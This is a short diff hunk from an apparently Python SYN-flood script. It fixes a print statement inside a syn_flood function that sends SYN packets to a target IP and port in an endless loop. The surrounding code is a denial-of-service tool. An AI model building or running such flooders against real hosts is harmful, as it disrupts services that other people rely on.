@@ -7,7 +7,7 @@ def syn_flood(target_ip, target_port):
     # Send the SYN packet in a loop
     while True:
         send(syn_packet, verbose=0)
-        print("Iteration: "+i)
+        print("Iteration: ",i)
         i=i+1
 
 if __name__ == "__main__":
